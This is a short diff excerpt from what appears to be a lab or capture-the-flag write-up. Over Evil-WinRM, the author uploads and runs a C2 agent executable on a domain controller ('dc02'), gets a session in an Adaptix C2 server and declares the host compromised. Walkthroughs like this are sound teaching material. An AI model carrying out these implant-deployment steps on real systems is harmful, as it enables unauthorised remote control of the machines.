@@ -659,4 +659,14 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\ldap_svc\Documents> upload dc02-corp-agent.x64.exe
 ```
-T
+Then after uploading it i can execute it
+
+```python
+*Evil-WinRM* PS C:\Users\ldap_svc\Documents> .\dc02-corp-agent.x64.exe
+```
+Now ill have a new session in adaptix c2
+
+![](Pasted%20image%2020260419185835.png)
+
+Now the dc02 has been compromised!
+
